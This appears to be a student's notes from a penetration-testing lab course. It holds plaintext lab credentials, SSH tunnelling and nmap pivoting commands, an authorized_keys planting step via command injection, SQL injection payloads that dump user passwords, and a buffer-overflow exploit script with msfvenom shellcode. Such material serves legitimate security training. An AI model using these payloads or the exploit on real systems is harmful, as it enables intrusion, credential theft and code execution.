http://10.50.20.250:8000/          TYFI-006-M  Ja7Gh0bmQhGeAWq
10.50.28.181  Semper
GREYHOST:     10.50.35.7                                                                           student     Ja7Gh0bmQhGeAWq
ACCESSING GREYHOST:
  ssh -X student@10.50.35.7                                                                        Ja7Gh0bmQhGeAWq
  ssh -MS /tmp/grey student@10.50.35.7                                                             Ja7Gh0bmQhGeAWq

#CREDENTIALS
  WINDOWS:    xfreerdp /u:student /v:10.50.42.187 -dynamic-resolution +glyph-cache +clipboard      password
  LINUX:      ssh -X student@10.50.29.84                                                           Charity@2006
  GREYHOST:                                                                                   Student     Long Pass
  
REBUILD BOXES:
  VTA
  INSTANCES
  REBUILD INSTANCE
  SELECT IMAGE: NIX_OPS
  PARTITIION: AUTOMATIC
  REBUILD INSTANCE
  

#NMAP SCRIPT COMMANDS
  /usr/share/nmap/scripts
  nmap --script <filename>|<category>|<directory>
  nmap --script-help "ftp-* and discovery"
  nmap --script-args <args>
  nmap --script-args-file <filename>
  nmap --script-help <filename>|<category>|<directory>
  nmap --script-trace
      http-enum.nse


#COMMANDS
  ssh -MS /tmp/grey student@10.50.35.7
  ssh -S /tmp/grey grey -O forward -D 9050
  for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
  proxychains nmap -v -sT -Pn -T4 -sV 192.168.28.1,2,3,97,98,99,100,105,111,120,129,130,131 -p-
  ssh -S /tmp/grey grey -O forward -L 40700:192.168.28.111:80
  ssh -S /tmp/grey grey -O forward -L 40710:192.168.28.111:22                                                  #Sets a new master socket referencing the original master socket to access an additional box
  ssh -MS /tmp/billybobhost billybob@0.0.0.0 -p 40710
  ssh -S /tmp/billybobhost -O forward -D 9050
  ssh -S /tmp/grey grey -O cancel -L 40700:192.168.28.111:80                                                   #Closes out a tunnel
  proxychains nmap -v -sT -Pn -T4 --script http-enum.nse 192.168.28.111 -p 80
  



ssh-keygen -t rsa -b 4096                                                                                        #Generates public ssh key
; mkdir /var/www/.ssh
; ls /var/www/ssh
vim test.txt
cat id_rsa.pub            ##HIGHLIGHT ALL OF IT##
copy to test.txt and addd > /var/www/.ssh/authorized_keys to the end
; echo (cat test.txt and copy over file contents) in quotes
ssh -i id_rsa www-data@10.50.27.157




#SQL INJECTION
  ##COMMANDS
SELECT                    Extracts data from a database
UNION                     Used to COMBINE the result-set of TWO OR MORE SELECT STATEMENTS
USE                       Selects the DB to use
UPDATE                    Updates data in a database
DELETE                    Deletes data from a database
INSERT INTO               Inserts new data into a database
CREATE DATABASE           Creates a new database
ALTER DATABASE            Modifies a database
CREATE TABLE              Creates a new table
ALTER TABLE               Modifies a table
DROP TABLE                Deletes a table
CREATE INDEX              Creates an index (search key)
DROP INDEX                Deletes an index

show databases;           shows databases
SELECT * FROM session.car shows all items within the car subtable of the session table
SELECT * FROM session.car UNION SELECT tireid,name,size,cost,1,2 FROM session.Tires;

shwo TABLES FROM information_schema
Select Table_schema,table_name,Column_name FROM information_schema.Column;
IMPORTANT:
  TABLES
  COLUMNS
  DATABASES/TABLE_SCHEMA

User = ' GySgt' or 1='1'
Pass = 'Pass' or 1='1'

php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'                               GOLDEN STATEMENT
Audi' UNION select table_schema,2,table_name,column_name,5 FROM information_schema.columns #
Audi' UNION select 1,2,3 #
Audi' UNION select id,2,name,pass,5 FROM session.user #
http://10.50.38.117/uniondemo.php?Selection=2%20or%201=1;%20#
http://10.50.38.117/uniondemo.php?Selection=2%20 UNION select 1,2,3;#
http://10.50.38.117/uniondemo.php?Selection=2%20 UNION select table_schema,column_name,table_name FROM information_schema.columns;#
http://10.50.38.117/uniondemo.php?Selection=2%20%20UNION select type,color,name FROM session.car;#

http://0.0.0.0:40756/cases/productsCategory.php?category=1%20UNION%20select%20last_name,password,email%20FROM%20sqlinjection.members;#
RAM' UNION select table_schema,column_name FROM information_schema.columns; #

UNION @@version
RAM' UNION select 1,@@version; #       GIVES SQL VERSION

http://0.0.0.0:40756/cases/productsCategory.php?category=1%20UNION%20SELECT%20Table_schema,column_name,Table_name%20FROM%20information_schema.columns;%20#
http://0.0.0.0:40756/cases/productsCategory.php?category=1%20UNION%20SELECT%201,comment,data%20FROM%20sqlinjection.share4%20WHERE%20id=1337;%20#

./func <<<$(./Desktop/Security/Linux/mybuff.py)        runs func and injects mybuff as the input

./func "YahWeh"                   Command Line Argument
Enter a string: 
./func <<<$(echo "YahWeh")        User Input
Enter a string: 


env - gdb ./func                  Starts gdb without environment variables
unset LINES(OR COLUMNS)           removes gdb environmental variables
gdb ./func
info functions
pdisass main

find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4    Searches starting after the heap to the end of the stack for a jump instruction pointing to the EIP

#PAYLOADS
  msfvenom -p linux/x86/exec CMD=ifconfig -b '\x00' -f python










#BUFFEROVERFLOW SCRIPT

#!/usr/bin/python2.7



#OFFSET

buf = "A" * 62  #OFFSET

'''
0xf7f650cf -> \xcf\x50\xf6\xf7
0xf7f65343 -> \x43\x53\xf6\xf7
0xf7f65497 -> \x97\x54\xf6\xf7
0xf7f655cf -> \xcf\x55\xf6\xf7
'''
buf += "\x59\x3b\xde\xf7"  #EIP REGISTER - JMP ESP
#msfvenom -p linux/x86/exec CMD=ifconfig -b '\x00' -f python
buf += "\x90" * 10
buf += b"\xba\xd3\xd9\xf0\xd0\xd9\xc7\xd9\x74\x24\xf4\x5d"
buf += b"\x31\xc9\xb1\x0c\x31\x55\x12\x83\xc5\x04\x03\x86"
buf += b"\xd7\x12\x25\x42\xe3\x8a\x5f\xc0\x95\x42\x4d\x87"
buf += b"\xd0\x74\xe5\x68\x90\x12\xf6\x1e\x79\x81\x9f\xb0"
buf += b"\x0c\xa6\x32\xa4\x06\x29\xb3\x34\x70\x4f\xd0\x5b"
buf += b"\xec\xe9\x7f\xc4\xf0\xa2\x2c\x83\x10\x81\x53"
print(buf)


